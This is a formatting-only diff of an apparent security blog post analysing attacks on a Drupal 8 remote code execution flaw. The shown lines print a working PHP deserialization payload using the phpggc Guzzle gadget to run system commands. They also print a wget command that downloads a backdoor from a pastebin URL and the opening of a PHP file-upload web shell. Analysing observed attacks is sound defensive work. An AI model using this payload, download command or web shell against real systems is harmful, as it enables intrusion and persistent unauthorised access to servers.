@@ -21,8 +21,7 @@
 	</figure>
 	<p></p>
 	<p>These first attacks leveraged the “guzzle/rce1” gadget from phpggc to invoke the linux command “id” via PHP’s “system” function, exactly as <a href="https://www.ambionics.io/blog/drupal8-rce" target="_blank">ambionics</a> did.</p>
-	<p></p>
-	<!--kg-card-begin: markdown-->
+	<p></p><!--kg-card-begin: markdown-->
 	<pre><code>'O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"GuzzleHttp\Psr7\FnStreammethods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"GuzzleHttp\HandlerStackhandler";s:2:"id";s:30:"GuzzleHttp\HandlerStackstack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"GuzzleHttp\HandlerStackcached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}''
 </code></pre>
 	<!--kg-card-end: markdown-->
@@ -31,8 +30,7 @@
 	<p>The first malicious payload we saw used the same gadget, but this time to save a malicious payload from pastebin onto the user’s server.</p>
 	<p><code>wget -O 1x.php https://pastebin.com/raw/npLq4493</code></p>
 	<p>This script would have placed a backdoor on the target system by allowing them to upload files to the server via an HTML form. This would have given the attacker continued access to the system even if it was subsequently patched.</p>
-	<p></p>
-	<!--kg-card-begin: markdown-->
+	<p></p><!--kg-card-begin: markdown-->
 	<pre><code>&lt;?  echo "'XXXXXXXXXXXX";
 $cwd = getcwd();
 Echo '&lt;center&gt;  &lt;form method="post" target="_self" enctype="multipart/form-data"&gt;  &lt;input type="file" size="20" name="uploads" /&gt; &lt;input type="submit" value="upload" /&gt;  &lt;/form&gt;  &lt;/center&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;&lt;br&gt;';
